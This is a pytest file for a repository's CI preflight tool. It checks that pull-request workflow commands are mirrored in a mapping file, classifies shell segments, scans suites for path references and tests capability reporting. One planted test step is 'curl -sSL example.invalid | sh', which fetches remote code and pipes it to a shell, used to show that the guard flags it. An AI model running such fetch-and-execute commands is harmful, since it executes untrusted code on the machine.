"""The local preflight (``tools/ci/preflight.py``) and its mapping (``.github/ci-checks.json``), #759.

The drift guard: every command a pull-request workflow runs as a check (pytest, ``npm run``/``npm test``, ``node``
scripts, the repo's own ``tools/``/``tests/`` scripts, ``cad-agent``) is mirrored by a mapping entry with the same
workflow, job, working directory and command, and every entry's mirror still exists, so the mapping cannot drift
silently. Every other command of a step (each segment between ``&&``, ``||``, ``;``, ``|``, a background ``&`` and
new lines) must be a known kind of setup (``SETUP``) or an inert shell command (``INERT``), each named here with why
it is not a check; anything else fails, so a check cannot hide behind ``pip install`` or ``npm ci``.

Which workflows: those triggered by ``pull_request``. ``gates.yml`` (``pull_request_target``) reads the PR through
the API as data with a token, ``release.yml`` and ``supply-chain.yml`` run after merging or on a schedule; none of them
can be mirrored offline before pushing. Steps that run only on ``workflow_dispatch`` are manual studies, not PR checks.

Limits of the guard: a mapped command whose ``env`` changes in the workflow is not noticed (the working directory is
compared, the environment is not); ``uses:`` steps (actions) are not read; only an ``if:`` that requires
``github.event_name == 'workflow_dispatch'`` as a top-level ``&&`` term (in every ``||`` alternative) makes a step
dispatch-only, and a ``ci_only`` entry's steps need ``failure()`` the same way; and the shell is split by a small
quote-aware tokenizer, not a shell parser: a setup or inert command holding ``$(``, a backtick or ``>(`` fails, but a
check hidden in a heredoc is not seen.

The path scan: for each entry, the test files and scripts its command names (directly or through its npm scripts) are
read for repo path literals (``'tools/…'``, ``'../../docs/…'``) that exist; each must be matched by the entry's globs,
so a hash or ``--check`` a suite runs on a file outside its folder selects it; a literal ending in ``/`` that is an
existing folder at least three levels deep (``tests/fixtures/assembly-plan/``; a bare ``software/`` is a prefix
test, not a dependency) must have every file under it in the entry's ``paths`` (its ``exclude`` stands). Its limits: only literals containing a ``/`` (a bare
``README.md`` is too ambiguous), not paths built by templates or ``path.join`` pieces, not the files those test files
import in turn, not the scripts a Python check runs beyond the one named, and not the pytest entries, which name test
folders (``pytest-core`` and ``pytest-full`` take every path instead). A string that is exactly an existing path in a
message is flagged too: over-selecting costs little.

Then the preflight's own behaviour, each on planted inputs: path matching, selection, capability reporting (a check
that cannot run here is "not run", never passed) and exit codes.
"""
from __future__ import annotations

import glob
import importlib.util
import json
import os
import re
import signal
import subprocess
import sys
import tempfile
import time
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[3]
WORKFLOWS = ROOT / ".github" / "workflows"
MAPPING = ROOT / ".github" / "ci-checks.json"

SPEC = importlib.util.spec_from_file_location("ci_preflight", ROOT / "tools" / "ci" / "preflight.py")
pf = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = pf                    # dataclasses look their module up while the class is built
SPEC.loader.exec_module(pf)

# A command that checks the change, as opposed to installing or configuring something.
CHECK = re.compile(r"""^(?:
    python3?\s+(?:-\w+\s+)*-m\s+pytest\b              # pytest
  | pytest\b
  | python3?\s+(?:-\w+\s+)*(?:tools|tests)/\S+\.py\b   # the repo's own check scripts
  | npm\s+(?:--prefix\s+\S+\s+)?(?:run|test)\b         # npm scripts
  | node\s+(?!-e\b|--version\b)\S                      # node tests and builds (not version probes)
  | cad-agent\b
)""", re.X)

# Commands that set up a runner, and why each is not a check of the change.
SETUP = {
    r"^npm (?:--prefix \S+ )?ci\b": "installs the locked Node dependencies",
    r"^(?:python3?\s+-m\s+)?pip install\b": "installs Python packages",
    r"^python -m playwright install chromium --only-shell$": "installs the capture scripts' pinned browser",
    r"^git config --global --add safe\.directory\b": "trusts the checkout inside the test container",
    r"^sudo python3 tools/ci/apt_mirror\.py$": "corrects the runner's apt mirror list",
    r"^sudo timeout \d+ (?:apt-get|dpkg)\b": "installs the runner's system libraries",
    r"^node --version$": "prints the toolchain",
    r"""^node -e "if \(Number\(process\.versions\.node\.split\('\.'\)\[0\]\) !== \d+\) process\.exit\(1\)"$""":
        "asserts the runner's Node major",
    r"""^python -c "import [\w., ]+; print\('extras import ok'\)"$""": "asserts the extras import (#151)",
    r"""^python -c "import shutil; assert shutil\.which\('pwsh'\), '[^']*'"$""": "asserts PowerShell is present",
}
# Shell plumbing that runs nothing of the change.
INERT = {
    r'^echo "': "prints, or writes a step output",
    r"^set -o pipefail$": "shell option",
    r"^grep -q ": "reads the build log",
    r"^tee ": "copies output to a log",
    r"^if \[ ": "a test of an event or variable",
    r"^for \w+ in [\w ]+$": "a retry loop",
    r"^(?:exit \d+|sleep \d+|true)$": "loop control",
    r"^apt_options=\(": "a shell variable",
    r"^(?:then|else|do|done|fi)$": "shell keywords",
}


# A step that runs only on a manual dispatch: its `if:` requires the event to equal workflow_dispatch
DISPATCH_ONLY = re.compile(r"github\.event_name\s*==\s*'workflow_dispatch'")
# A step that runs only after an earlier one failed: its `if:` requires failure()
AFTER_FAILURE = re.compile(r"failure\(\s*\)")
# Command substitution or process substitution runs a command inside an otherwise inert one
SUBSHELL = re.compile(r"\$\(|`|[<>]\(")


def _top_level(expr: str, op: str) -> list[str]:
    """``expr`` (a GitHub Actions expression) split at ``op`` outside quotes and parentheses."""
    out, cur, depth, quote, i = [], "", 0, False, 0
    while i < len(expr):
        c = expr[i]
        if c == "'":
            quote = not quote                          # '' inside a string toggles twice: still inside
        elif not quote and c in "([":
            depth += 1
        elif not quote and c in ")]":
            depth -= 1
        elif not quote and depth == 0 and expr.startswith(op, i):
            out.append(cur)
            cur, i = "", i + len(op)
            continue
        cur += c
        i += 1
    return out + [cur]


def _unwrap(expr: str) -> str:
    """``expr`` without ``${{ }}``, surrounding whitespace and parentheses that enclose all of it."""
    expr = expr.strip()
    m = re.fullmatch(r"\$\{\{(.*)\}\}", expr, re.S)
    if m:
        expr = m.group(1).strip()
    while expr.startswith("(") and expr.endswith(")"):
        depth, quote = 0, False
        for i, c in enumerate(expr):                     # where the leading ( closes
            if c == "'":
                quote = not quote
            elif not quote:
                depth += (c == "(") - (c == ")")
                if depth == 0:
                    break
        if i != len(expr) - 1:                           # `(a) && (b)`: the parentheses do not enclose it all
            break
        expr = expr[1:-1].strip()
    return expr


def requires(condition, term: re.Pattern) -> bool:
    """Whether the ``if:`` ``condition`` holds only when ``term`` does: every ``||`` alternative has ``term`` as a
    top-level ``&&`` operand. ``always() || failure()``, ``!failure()`` and a ``'failure()'`` string do not."""
    expr = _unwrap(str(condition or ""))
    if not expr:
        return False
    alternatives = _top_level(expr, "||")
    if len(alternatives) > 1:
        return all(requires(a, term) for a in alternatives)
    operands = _top_level(expr, "&&")
    if len(operands) > 1:
        return any(requires(o, term) for o in operands)
    return bool(term.fullmatch(expr))


def _split(line: str) -> list[str]:
    """``line`` split at ``&&``, ``||``, ``;``, ``|`` and a lone ``&`` (a background command) outside quotes; the
    ``&`` of a redirection (``2>&1``, ``&>``) is not a split point."""
    out, cur, quote, i = [], "", None, 0
    while i < len(line):
        c = line[i]
        lone_amp = (c == "&" and not line.startswith("&&", i) and not cur.endswith((">", "<"))
                    and not line.startswith("&>", i))
        if quote:
            quote = None if c == quote else quote
        elif c in "\"'":
            quote = c
        elif line.startswith(("&&", "||"), i) or c in ";|" or lone_amp:
            out.append(cur)
            cur = ""
            i += 2 if line.startswith(("&&", "||"), i) else 1
            continue
        cur += c
        i += 1
    return out + [cur]


def segments(script: str) -> list[str]:
    """The simple commands of a ``run:`` script: lines split at ``&&``, ``||``, ``;`` and ``|`` outside quotes,
    without comments or the shell keywords that lead them, whitespace collapsed."""
    out = []
    for line in script.splitlines():
        line = re.sub(r"\s#\s.*$", "", line).strip()
        if not line or line.startswith("#"):
            continue
        for seg in _split(line):
            seg = re.sub(r"^(?:then|else|do)\s+", "", seg.strip())
            if seg:
                out.append(" ".join(seg.split()))
    return out


def kind(segment: str) -> str | None:
    """``check``, ``setup`` or ``inert`` for a known command; None for anything else."""
    if CHECK.match(segment):
        return "check"
    if SUBSHELL.search(segment):                       # `pip install $(make test)` runs make: not setup, not inert
        return None
    if any(re.match(rx, segment) for rx in SETUP):
        return "setup"
    if any(re.match(rx, segment) for rx in INERT):
        return "inert"
    return None


def pr_workflows(folder: Path = WORKFLOWS) -> dict[str, dict]:
    flows = {}
    for path in sorted(folder.glob("*.yml")):
        doc = yaml.safe_load(path.read_text(encoding="utf-8"))
        on = doc.get("on", doc.get(True, {}))                 # YAML 1.1 reads a bare `on` key as True
        events = on if isinstance(on, (list, str)) else list(on or {})
        if "pull_request" in ([events] if isinstance(events, str) else events):
            flows[path.name] = doc
    return flows


def workflow_steps(flows: dict[str, dict]):
    """``(workflow, job, step label, working directory, run script)`` for every PR-time ``run:`` step."""
    for name, doc in flows.items():
        for job_id, job in (doc.get("jobs") or {}).items():
            default_cwd = ((job.get("defaults") or {}).get("run") or {}).get("working-directory", ".")
            for i, step in enumerate(job.get("steps") or []):
                if "run" not in step or requires(step.get("if"), DISPATCH_ONLY):
                    continue
                label = step.get("name") or f"step {i + 1} (`{segments(step['run'])[0][:60]}`)"
                yield name, job_id, label, step.get("working-directory", default_cwd), step["run"]


def audit(flows: dict[str, dict], mapping: dict) -> tuple[list[str], list[str], set, set]:
    """``(unmapped, unclassified, found, mirrored)``: messages for check commands no entry mirrors and for commands
    that are neither checks, known setup nor inert; the (workflow, job, cwd, command) keys found in the workflows and
    in the mapping. A mirror's cwd is its own ``cwd``, else its entry's."""
    mirrored = {(m["workflow"], m["job"], m.get("cwd", c.get("cwd", ".")), " ".join(m["run"].split()))
                for c in mapping["checks"] for m in c["mirrors"]}
    unmapped, unclassified, found = [], [], set()
    for wf, job, label, cwd, script in workflow_steps(flows):
        for seg in segments(script):
            what = kind(seg)
            if what is None:
                unclassified.append(f"{wf} / {job} / {label}: runs `{seg}`, which is neither a mapped check, known "
                                    f"setup nor inert. If it checks the change, add a mapping entry to "
                                    f".github/ci-checks.json (and its pattern to CHECK here); if it only sets up, add "
                                    f"its kind to SETUP here with why.")
            elif what == "check":
                found.add((wf, job, cwd, seg))
                if (wf, job, cwd, seg) not in mirrored:
                    unmapped.append(f"{wf} / {job} / {label}: `{seg}` (in {cwd}) has no entry in "
                                    f".github/ci-checks.json. Add a mapping entry whose mirrors include "
                                    f"{{\"workflow\": \"{wf}\", \"job\": \"{job}\", \"run\": {json.dumps(seg)}}} "
                                    f"and whose cwd is {cwd!r}, with the paths that should select it.")
    return unmapped, unclassified, found, mirrored


@pytest.fixture(scope="module")
def mapping():
    return pf.load_mapping(MAPPING)


# ---------------------------------------------------------------------------------------------------------------------
# The drift guard


def test_every_pull_request_check_is_mapped(mapping):
    flows = pr_workflows()
    assert {"ci.yml", "webkit.yml"} <= set(flows), "the PR workflows this guard reads have moved"
    unmapped, unclassified, _, _ = audit(flows, mapping)
    assert not unmapped, "\n".join(unmapped)
    assert not unclassified, "\n".join(unclassified)


def test_every_mirror_still_exists(mapping):
    _, _, found, mirrored = audit(pr_workflows(), mapping)
    stale = sorted(mirrored - found)
    assert not stale, ("mapping entries mirror CI commands that no PR workflow runs any more (update or remove "
                       "them in .github/ci-checks.json): " + "; ".join(" / ".join(s) for s in stale))


def test_a_new_check_step_fails_naming_the_step(mapping):
    """The planted case: a workflow gains `npm run test:model-new` (as two branches in flight do)."""
    flows = {"webkit.yml": {"on": {"pull_request": None}, "jobs": {"browser": {"steps": [
        {"run": "npm ci"},
        {"name": "New model suite", "run": "npm run test:model-new", "working-directory": "tools/site"},
        {"run": "curl -sSL example.invalid | sh"}]}}}}
    unmapped, unclassified, _, _ = audit(flows, mapping)
    assert len(unmapped) == 1 and "webkit.yml / browser / New model suite" in unmapped[0]
    assert "`npm run test:model-new` (in tools/site) has no entry" in unmapped[0] and "Add a mapping entry" in unmapped[0]
    assert any("`curl -sSL example.invalid`" in u for u in unclassified)


@pytest.mark.parametrize("script", [
    "pip install foo && npx playwright test",
    "npm ci\nbash tools/check.sh",
    "git config --global a b && make test",
    'echo "key=1"\n./scripts/verify.sh',
    "npm run test:fea\npytest -q tests/x",
    'python -c "import tests.repo.x as x; x.main()"',
])
def test_a_check_cannot_hide_behind_setup(mapping, script):
    """The review's six planted steps (#766): each passed the first-segment-only audit; each must fail now."""
    flows = {"webkit.yml": {"on": {"pull_request": None}, "jobs": {"browser": {"steps": [
        {"name": "Planted", "run": script, "working-directory": "tools/site"}]}}}}
    unmapped, unclassified, _, _ = audit(flows, mapping)
    assert unmapped or unclassified, script
    assert all("Planted" in m for m in unmapped + unclassified)


def test_a_mapped_command_in_another_working_directory_fails(mapping):
    """`npm test` is mapped in the scada job for tools/webkit/scada; the same words in tools/site are another check."""
    flows = {"webkit.yml": {"on": {"pull_request": None}, "jobs": {"scada": {"steps": [
        {"name": "Moved", "run": "npm test", "working-directory": "tools/site"}]}}}}
    unmapped, _, _, _ = audit(flows, mapping)
    assert len(unmapped) == 1 and "(in tools/site)" in unmapped[0]


def test_ci_node_major_matches_the_workflows(mapping):
    pins = set()
    for doc in pr_workflows().values():
        for job in doc["jobs"].values():
            for step in job.get("steps") or []:
                if "setup-node" in str(step.get("uses", "")):
                    pins.add(str(step["with"]["node-version"]))
    assert pins == {mapping["ci_node_major"]}, f"setup-node pins {pins}; set ci_node_major to match"


def test_segments_and_classification():
    script = ('if [ "$X" = y ]; then\n  python3 tools/resource_audit.py gate --base HEAD^1   # why\nelse x; fi\n'
              'node tools/site/build-site.mjs --out "$T/site" | tee "$T/site.log"\n'
              'pip install "optuna==3.4.0" && python -m pytest -q tests/a.py\nnode --version && node -e "1"')
    segs = segments(script)
    assert "python3 tools/resource_audit.py gate --base HEAD^1" in segs
    assert 'node tools/site/build-site.mjs --out "$T/site"' in segs
    assert [s for s in segs if kind(s) == "check"] == ["python3 tools/resource_audit.py gate --base HEAD^1",
                                                  'node tools/site/build-site.mjs --out "$T/site"',
                                                  "python -m pytest -q tests/a.py"]


def test_mapping_is_well_formed(mapping):
    ids = [c["id"] for c in mapping["checks"]]
    assert len(ids) == len(set(ids)), "check ids are unique"
    seen = set()
    for c in mapping["checks"]:
        where = f"check {c['id']}"
        assert re.fullmatch(r"[a-z0-9-]+", c["id"]), where
        assert c["paths"] and c["command"] and c["mirrors"], where
        assert c.get("cost") in {"fast", "slow"}, where
        assert (ROOT / c.get("cwd", ".")).is_dir(), f"{where}: cwd {c.get('cwd')} is not a folder"
        need = c.get("needs", {})
        for folder in need.get("node_deps", []):
            assert (ROOT / folder / "package-lock.json").exists(), f"{where}: {folder} has no package-lock.json"
        for dep in need.get("after", []):
            assert dep in seen, f"{where}: `after` names {dep}, which must come earlier"
        for engine in c.get("engines", []) + ([need["browser"]] if need.get("browser") else []):
            assert engine in {"chromium", "webkit"}, where
        for m in c["mirrors"]:
            assert (WORKFLOWS / m["workflow"]).exists(), f"{where}: {m['workflow']} does not exist"
        for glob in c["paths"] + c.get("exclude", []):
            pf.glob_regex(glob)
        seen.add(c["id"])


@pytest.mark.parametrize("script,cwd", [("thumbnails:scenarios:check", "tools/webkit/scada"),
                                        ("test:webkit-unit", "tools/site")])
def test_npm_scripts_named_by_the_mapping_exist(mapping, script, cwd):
    commands = {(c["command"], c.get("cwd", ".")) for c in mapping["checks"]}
    assert (f"npm run {script}", cwd) in commands
    assert script in json.loads((ROOT / cwd / "package.json").read_text())["scripts"]


# ---------------------------------------------------------------------------------------------------------------------
# The path scan: every repo file a suite names is a path that selects it

PATH_LITERAL = re.compile(r"""['"`]((?:\.{1,2}/)*(?:[\w@.-]+/)+(?:[\w@.-]+\.\w+)?)['"`]""")


def suite_files(check: dict) -> list[Path]:
    """The test files and scripts ``check``'s command names, directly or through the npm scripts it runs."""
    cmd, cwd = check["command"], ROOT / check.get("cwd", ".")
    m = re.match(r"npm (?:--prefix (\S+) )?(?:run (\S+)|test\b)", cmd)
    words = cmd.split()
    if m:
        cwd = ROOT / (m.group(1) or check.get("cwd", "."))
        scripts = json.loads((cwd / "package.json").read_text())["scripts"]
        todo, seen, words = [m.group(2) or "test"], set(), []
        while todo:
            name = todo.pop()
            if name not in seen:
                seen.add(name)
                todo += re.findall(r"npm run ([\w:-]+)", scripts[name])
                words += scripts[name].split()
    files = []
    for w in (w.strip("'\"") for w in words):
        if "/" in w and re.search(r"\.(mjs|js|py)$", w):
            files += [Path(os.path.normpath(f)) for f in glob.glob(str(cwd / w)) if Path(f).is_file()]
    return files


def unmatched_references(check: dict) -> dict[str, set[str]]:
    """Existing repo files the suite's files name by a literal path, which the entry's globs do not select."""
    missing: dict[str, set[str]] = {}
    for f in suite_files(check):
        for lit in set(PATH_LITERAL.findall(f.read_text(encoding="utf-8", errors="replace"))):
            for base in (ROOT, f.parent):
                p = Path(os.path.normpath(base / lit))
                folder = lit.endswith("/") and p.is_dir() and ROOT in p.parents and len(p.relative_to(ROOT).parts) >= 3
                if not (p.is_file() or folder) or ROOT not in p.parents or "node_modules" in p.parts:
                    continue
                rel = p.relative_to(ROOT).as_posix()
                inside = [q.relative_to(ROOT).as_posix() for q in p.rglob("*") if q.is_file()] if folder else [rel]
                # a folder counts as covered when its files are in `paths`: an `exclude` is a deliberate choice
                covered = [q for q in inside if pf.matches(q, check.get("paths", []))] if folder else \
                    pf.matched_paths(check, inside)
                if inside and len(covered) < len(inside):
                    missing.setdefault(rel + ("/" if folder else ""), set()).add(f.relative_to(ROOT).as_posix())
                break
    return missing


def test_every_file_a_suite_names_selects_it(mapping):
    """#766: webkit-unit hashed tools/gyropup_showcase.py and five figure stills but was not selected by them."""
    problems, scanned = [], 0
    for check in mapping["checks"]:
        scanned += bool(suite_files(check))
        for rel, by in sorted(unmatched_references(check).items()):
            problems.append(f"{check['id']}: {rel} (named in {', '.join(sorted(by))}) is not in its paths")
    assert scanned >= 20, f"only {scanned} entries had files to scan: the scan has stopped finding them"
    assert not problems, "add these paths (or a glob over them) to the entries:\n" + "\n".join(problems)


def test_the_scan_sees_a_folder_literal():
    """#766 re-review: assembly-guide serves '../../fixtures/assembly-plan/', a folder, which the scan did not see."""
    check = {"id": "a", "paths": ["software/cadagent/webkit/**", "tests/webkit/assembly/**"],
             "command": "npm run test:assembly-guide", "cwd": "tools/site"}
    assert "tests/fixtures/assembly-plan/" in unmatched_references(check)
    check["paths"].append("tests/fixtures/assembly-plan/**")
    assert "tests/fixtures/assembly-plan/" not in unmatched_references(check)


def test_the_scan_finds_a_planted_reference(tmp_path):
    check = {"id": "w", "paths": ["software/cadagent/webkit/**"], "command": "npm run test:webkit-unit",
             "cwd": "tools/site"}
    assert "tools/gyropup_showcase.py" in unmatched_references(check)
    check["paths"].append("tools/**")
    assert "tools/gyropup_showcase.py" not in unmatched_references(check)


# ---------------------------------------------------------------------------------------------------------------------
# Path matching and selection


@pytest.mark.parametrize("glob,path,hit", [
    ("**", "README.md", True),
    ("**/*.md", "README.md", True),
    ("**/*.md", "docs/a/b.md", True),
    ("software/cadagent/*.py", "software/cadagent/cli.py", True),
    ("software/cadagent/*.py", "software/cadagent/mechanical/holes.py", False),
    ("software/cadagent/webkit/**", "software/cadagent/webkit/scada/explorer/main.mjs", True),
    ("tests/webkit/*.test.mjs", "tests/webkit/files/x.test.mjs", False),
    ("tools/site/assets/install.*", "tools/site/assets/install.ps1", True),
    ("docs/?.md", "docs/ab.md", False),
])
def test_glob_matching(glob, path, hit):
    assert bool(pf.glob_regex(glob).match(path)) is hit


@pytest.mark.parametrize("path", ["docs/research/process-profiles.yaml", "docs/research/references.yaml",
                                  "docs/research/references/guides-inserts.yaml"])
def test_packaged_manufacturing_data_selects_the_wheel_smoke(mapping, path):
    assert "wheel-smoke" in {item.id for item in pf.select(mapping, [path])}


def test_the_real_case_selects_the_scada_provenance_check(mapping):
    """#753's first commit changed the explorer's main.mjs without regenerating thumbnails.json."""
    ids = {i.id for i in pf.select(mapping, ["software/cadagent/webkit/scada/explorer/main.mjs"])}
    assert {"scada-scenario-thumbnails", "scada-explorer-browser[chromium]", "scada-explorer-browser[webkit]",
            "pytest-repo"} <= ids
    assert "webkit-unit" not in ids and "fea[chromium]" not in ids          # the scada kit is excluded there


def test_acceptance_coverage(mapping):
    """The issue's floor: model and SCADA source hashes, browser suites per component, tests/repo, the site build."""
    def ids(path):
        return {i.check["id"] for i in pf.select(mapping, [path])}
    assert "webkit-unit" in ids("software/cadagent/webkit/model/model.js")          # renderer_sha256
    assert {"site-build", "site-browser"} <= ids("docs/practice/agent-workflow.md")
    assert {"fea", "stage", "part-table", "file-viewer", "assembly-guide"} <= ids("software/cadagent/webkit/ui/x.js")
    assert "pytest-repo" in ids("tools/ci/preflight.py")
    assert "repo-map" in ids("tests/repo/ci/README.md")                               # a new folder needs docs/map.md


@pytest.mark.parametrize("readme", ["tests/repo/ci/README.md", "tools/ci/README.md", "README.md",
                                    "software/cadagent/mechanical/README.md", ".github/CONTRIBUTING.md"])
def test_a_readme_anywhere_selects_the_site_browser_diagram_widths(mapping, readme):
    """#766: tests/repo/ci/README.md's new map was 748 px wide at 1100 px and failed website-browser.mjs's diagram
    widths in CI. Every README (and CONTRIBUTING, which owns .github's map) is published as a page, so a change to one
    selects the site build, the browser test that measures its diagrams in both engines, and the folder-map drawing."""
    ids = {i.id for i in pf.select(mapping, [readme])}
    assert {"site-build", "site-browser[chromium]", "site-browser[webkit]", "folder-maps", "repo-map"} <= ids, ids


@pytest.mark.parametrize("path", ["docs/research/process-profiles.yaml", "tools/research_figures.py", "x.txt"])
def test_whole_suite_entries_take_every_path(mapping, path):
    """CI runs the whole pytest suite on every pull request; its tests read docs/ and tools/ too (#766)."""
    ids = {i.check["id"] for i in pf.select(mapping, [path])}
    assert {"pytest-core", "pytest-full"} <= ids


@pytest.mark.parametrize("path", ["tools/gyropup_showcase.py", "tools/site/figures/fan-curve-still.mjs",
                                  "tools/mermaid/package-lock.json", "docs/img/gyropup/SOURCE.json"])
def test_webkit_unit_hash_sources_select_it(mapping, path):
    assert "webkit-unit" in {i.check["id"] for i in pf.select(mapping, [path])}


def test_engines_exclude_and_per_match():
    mapping = {"checks": [
        {"id": "b", "paths": ["kit/**"], "exclude": ["kit/scada/**"], "engines": ["chromium", "webkit"],
         "command": "x", "mirrors": []},
        {"id": "d", "paths": ["software/cadagent/**"], "per_match": r"^software/cadagent/(?P<domain>[a-z]+)/",
         "per_match_requires": ["tests/{domain}"], "command": "pytest tests/{domain}", "mirrors": []}]}
    sel = pf.select(mapping, ["kit/a.js", "kit/scada/b.js", "software/cadagent/repo/x.py",
                              "software/cadagent/nowhere/y.py"], ROOT)
    assert [i.id for i in sel] == ["b[chromium]", "b[webkit]", "d:repo"]
    assert sel[0].because == ["kit/a.js"]
    assert sel[2].command({}) == "pytest tests/repo"


# ---------------------------------------------------------------------------------------------------------------------
# Capability reporting: what cannot run here is "not run", with the reason


def _machine(tmp_path, probes=None, browsers=(), node=(), chrome=False, monkeypatch=None):
    root = tmp_path / "repo"
    for folder in node:
        (root / folder / "node_modules").mkdir(parents=True)
        (root / folder / "node_modules" / ".package-lock.json").write_text("{}")
    pw = root / "tools/site/node_modules/playwright-core"
    pw.mkdir(parents=True, exist_ok=True)
    (pw / "browsers.json").write_text(json.dumps({"browsers": [
        {"name": "chromium", "revision": "1194"}, {"name": "chromium-headless-shell", "revision": "1194"},
        {"name": "webkit", "revision": "2215"}]}))
    cache = tmp_path / "browsers"
    for b in browsers:
        (cache / b).mkdir(parents=True)
    machine = pf.Machine(root, env={"PATH": "/usr/bin:/bin", "HOME": str(tmp_path), "PLAYWRIGHT_BROWSERS_PATH": str(cache)})
    if monkeypatch is not None:
        monkeypatch.setattr(pf, "CHROME_CHANNEL", tmp_path / ("chrome" if chrome else "absent"))
        if chrome:
            (tmp_path / "chrome").write_text("")
    if probes is not None:
        machine.python_candidates = lambda: list(probes)
        machine.probe = lambda exe, modules, dists, pythonpath: probes[exe]
    return machine


def _probe(version, mods=(), dists=None, playwright=None):
    return {"version": version, "prefix": f"/env/{version}/{'-'.join(mods)}", "modules": {m: True for m in mods},
            "dists": dists or {}, "playwright": playwright}


def _assess(check, machine, slow=False, engine=None, done=None):
    inst = pf.Instance(check, engine)
    pf.assess(inst, machine, slow, done or {}, {"tmp": "/t", "base": "b", "root": "/r"})
    return inst


def test_exact_python_minor_that_differs_is_not_run(tmp_path):
    need = {"python": {"version": "3.12", "exact": True, "modules": ["PIL"], "why": "fingerprint"}}
    machine = _machine(tmp_path, probes={"/py313": _probe("3.13.1", ["PIL"]), "/py312": _probe("3.12.4")})
    inst = _assess({"id": "x", "command": "c", "needs": need}, machine)
    assert inst.status == "not run"
    assert "version differs: /py313 is 3.13, CI pins 3.12 (fingerprint)" in inst.reason
    assert "/py312 (3.12) lacks PIL" in inst.reason


def test_inexact_python_minor_runs_with_a_note(tmp_path):
    need = {"python": {"version": "3.12", "modules": ["yaml"]}}
    machine = _machine(tmp_path, probes={"/py313": _probe("3.13.1", ["yaml"])})
    inst = _assess({"id": "x", "command": "c", "needs": need}, machine)
    assert inst.status == "runnable" and inst.python == "/py313"
    assert any("CI pins 3.12: evidence only" in n for n in inst.notes)


def test_matching_minor_is_preferred_and_dist_pins_are_checked(tmp_path):
    need = {"python": {"version": "3.12", "modules": [], "dists": ["optuna==3.4.0"]}}
    probes = {"/a": _probe("3.13.0", dists={"optuna": "3.4.0"}), "/b": _probe("3.12.1", dists={"optuna": "3.4.0"}),
              "/c": _probe("3.12.2", dists={"optuna": "4.0.0"})}
    inst = _assess({"id": "x", "command": "c", "needs": need}, _machine(tmp_path, probes=probes))
    assert inst.python == "/b" and not inst.notes
    del probes["/a"], probes["/b"]
    inst = _assess({"id": "x", "command": "c", "needs": need}, _machine(tmp_path / "2", probes=probes))
    assert inst.status == "not run" and "lacks optuna==3.4.0" in inst.reason


def test_browser_engines(tmp_path, monkeypatch):
    check = {"id": "s", "command": "c", "engines": ["chromium", "webkit"]}
    m = _machine(tmp_path, monkeypatch=monkeypatch)
    inst = _assess(check, m, engine="webkit")
    assert inst.status == "not run" and "WebKit r2215" in inst.reason and "Not installed for you" in inst.reason
    assert _assess(check, m, engine="chromium").status == "not run"
    m = _machine(tmp_path / "chrome", chrome=True, browsers=["chromium-1243"], monkeypatch=monkeypatch)
    inst = _assess(check, m, engine="chromium")
    assert inst.status == "runnable" and "PLAYWRIGHT_CHANNEL" not in inst.env
    assert inst.env["CHROMIUM_EXECUTABLE"] == str(pf.CHROME_CHANNEL)       # model-explode reads only this
    m.env["CHROMIUM_EXECUTABLE"] = "/opt/mine/chrome"                       # the caller's choice is never replaced
    preset = _assess(check, m, engine="chromium")
    assert preset.env["CHROMIUM_EXECUTABLE"] == "/opt/mine/chrome" and preset.differs == ["browser"]
    assert any("/opt/mine/chrome" in n for n in preset.notes)
    assert any("not CI's Playwright Chromium r1194" in n and "chromium-1243" in n for n in inst.notes)
    m = _machine(tmp_path / "exact", browsers=["chromium-1194", "chromium_headless_shell-1194", "webkit-2215"],
                 monkeypatch=monkeypatch)
    assert _assess(check, m, engine="chromium").env == {"PLAYWRIGHT_BROWSER": "chromium", "PLAYWRIGHT_CHANNEL": "chromium"}
    assert _assess(check, m, engine="chromium").differs == []
    assert _assess(check, m, engine="webkit").env == {"PLAYWRIGHT_BROWSER": "webkit"}


def test_a_preset_chromium_executable_is_kept_named_and_flagged(tmp_path, monkeypatch):
    """#766 re-review: a caller's CHROMIUM_EXECUTABLE replaces CI's build in both branches, so it is named and flagged,
    and the local-Chrome fallback never overwrites it."""
    check = {"id": "s", "command": "c", "engines": ["chromium"]}
    for name, kw in [("exact", {"browsers": ["chromium-1194", "chromium_headless_shell-1194"]}),
                     ("chrome", {"chrome": True, "browsers": ["chromium-1243"]}),
                     ("none", {})]:
        m = _machine(tmp_path / name, monkeypatch=monkeypatch, **kw)
        m.env["CHROMIUM_EXECUTABLE"] = "/opt/my/chromium"
        inst = _assess(check, m, engine="chromium")
        assert inst.status == "runnable", name
        assert inst.env.get("CHROMIUM_EXECUTABLE", "/opt/my/chromium") == "/opt/my/chromium", name
        assert inst.differs == ["browser"], name
        assert any("CHROMIUM_EXECUTABLE=/opt/my/chromium" in n and "r1194" in n for n in inst.notes), name
        assert not any(str(pf.CHROME_CHANNEL) in n for n in inst.notes), name


def test_node_deps_os_slow_and_order(tmp_path):
    m = _machine(tmp_path, node=["tools/a"])
    assert _assess({"id": "x", "command": "c", "needs": {"node_deps": ["tools/a"]}}, m).status == "runnable"
    inst = _assess({"id": "x", "command": "c", "needs": {"node_deps": ["tools/b"]}}, m)
    assert inst.status == "not run" and "npm ci" in inst.reason
    inst = _assess({"id": "x", "command": "c", "needs": {"os": "plan9"}}, m)
    assert inst.status == "not run" and "Plan9" in inst.reason
    inst = _assess({"id": "x", "command": "c", "cost": "slow", "cost_note": "big"}, m)
    assert inst.status == "skipped" and "big" in inst.reason and "--slow" in inst.reason
    assert _assess({"id": "x", "command": "c", "cost": "slow"}, m, slow=True).status == "runnable"
    inst = _assess({"id": "x", "command": "c", "needs": {"after": ["site-build"]}}, m)
    assert inst.status == "not run" and "not selected" in inst.reason
    built = pf.Instance({"id": "site-build", "provides_env": {"SITE": "{tmp}/site"}}, status="passed")
    inst = _assess({"id": "x", "command": "c", "needs": {"after": ["site-build"]}}, m, done={"site-build": built})
    assert inst.status == "runnable" and inst.env == {"SITE": "/t/site"}
    built.status = "failed"
    assert _assess({"id": "x", "command": "c", "needs": {"after": ["site-build"]}}, m,
                   done={"site-build": built}).status == "not run"


# ---------------------------------------------------------------------------------------------------------------------
# Exit codes, end to end on a scratch repository


@pytest.fixture(autouse=True)
def _run_folders_in_tmp_path(tmp_path, monkeypatch):
    """The tool's run folders (kept when a check fails) go under this test's tmp_path, not the system temp."""
    folder = tmp_path / "system-temp"
    folder.mkdir()
    monkeypatch.setattr(tempfile, "tempdir", str(folder))
    monkeypatch.setenv("TMPDIR", str(folder))


def _repo(tmp_path, checks):
    root = tmp_path / "repo"
    root.mkdir()
